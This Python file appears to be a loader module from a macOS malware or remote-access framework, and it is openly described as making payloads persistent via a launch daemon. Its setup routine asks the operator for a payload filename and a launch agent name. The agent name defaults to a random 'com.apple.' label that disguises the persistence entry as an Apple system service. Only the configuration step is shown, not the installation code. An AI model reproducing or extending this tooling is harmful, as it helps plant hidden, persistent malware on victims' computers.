# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from bot.loaders.helper import *


class Loader(LoaderABC):
    def get_info(self) -> dict:
        return {
            "Author": ["Marten4n6"],
            "Description": "Makes payloads persistent via a launch daemon.",
            "References": []
        }

    def setup(self) -> dict:
        launch_agent_name = input(MESSAGE_INPUT + "Launch agent name [ENTER for com.apple.<RANDOM>]: ")

        if not launch_agent_name:
            launch_agent_name = "com.apple.{}".format(random_string())
            print(MESSAGE_INFO + "Using: {}".format(launch_agent_name))

        payload_filename = input(MESSAGE_INPUT + "Payload filename [ENTER for <RANDOM>]: ")

        if not payload_filename:
            payload_filename = random_string()
            print(MESSAGE_INFO + "Using: {}".format(payload_filename))

        return {
            "loader_name": "launch_daemon",
            "launch_agent_name": launch_agent_name,
            "payload_filename": payload_filename
        }
